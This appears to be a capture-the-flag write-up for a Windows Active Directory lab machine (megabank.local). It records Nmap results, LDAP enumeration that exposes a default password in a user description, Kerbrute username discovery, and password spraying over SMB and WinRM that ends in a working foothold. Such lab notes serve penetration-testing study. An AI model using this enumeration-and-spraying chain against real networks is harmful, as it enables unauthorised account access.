# Nmap
```
53/tcp   open  domain       syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-01-13 21:43:23Z)
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open   óýU       syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?    syn-ack
593/tcp  open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack
3268/tcp open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack
```

# 389 - LDAP

## windapsearch

```py
./windapsearch.py -d resolute.megabank.local --dc-ip $RHOST -U
./windapsearch.py -d resolute.megabank.local --dc-ip $RHOST -U --full

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20190927131714.0Z
whenChanged: 20191203132427.0Z
displayName: Marko Novak
uSNCreated: 13110
uSNChanged: 69792
name: Marko Novak
objectGUID: 8oIRSXQNmEW4iTLjzuwCpw==
userAccountControl: 66048
badPwdCount: 2
codePage: 0
countryCode: 0
badPasswordTime: 133496617994796588
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132140638345690606
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z

# Kerbrute
2024/01/14 00:25:34 >  [+] VALID USERNAME:       marko@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       sunita@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       marcus@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       sally@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       ryan@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       abigail@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       Administrator@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       gustavo@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       fred@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       felicia@megabank.local
2024/01/14 00:25:34 >  [+] VALID USERNAME:       angela@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       stevie@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       ulf@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       paulo@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       annette@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       steve@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       claire@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       annika@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       melanie@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       claude@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       per@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       zach@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       simon@megabank.local
2024/01/14 00:25:35 >  [+] VALID USERNAME:       naoki@megabank.local
2024/01/14 00:25:35 >  Done! Tested 27 usernames (24 valid) in 0.631 seconds
```

- Possible default password for users `Welcome123!`
# Password spraying

`go_map_exec -uf` for users file, `-pr` for services to spray

```
~/repos/Go_Map_Exec/go_map_exec -uf users.validkerb -pr 'smb winrm' -p 'Welcome123!' $RHOST
Scanning host 1/1 (10.129.96.155)...
Checking SMB on 10.129.96.155...
<snip>
SMB Authentication failed for user #19 with per using Welcome123! on 10.129.96.155
→ SMB Successfully authenticated with credentials melanie/Welcome123! on 10.129.96.155 ←

SMBMap Result:
[+] IP: 10.129.96.155:445       Name: megabank.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[/] Authenticating...

SMB Authentication failed for user #21 with annika using Welcome123! on 10.129.96.155
SMB Authentication failed for user #22 with zach using Welcome123! on 10.129.96.155
SMB Authentication failed for user #23 with naoki using Welcome123! on 10.129.96.155
SMB Authentication failed for user #24 with simon using Welcome123! on 10.129.96.155
Checking WinRM on 10.129.96.155...
<snip>
WINRM Connection failed: Authentication failed on 10.129.96.155 with per/Welcome123!
→ WinRM Successfully authenticated with credentials melanie/Welcome123! on 10.129.96.155 ←
WINRM Connection failed: Authentication failed on 10.129.96.155 with annika/Welcome123!
WINRM Connection failed: Authentication failed on 10.129.96.155 with zach/Welcome123!
WINRM Connection failed: Authentication failed on 10.129.96.155 with naoki/Welcome123!
WINRM Connection failed: Authentication failed on 10.129.96.155 with simon/Welcome123!

```

# Foothold
`melanie:Welcome123!`

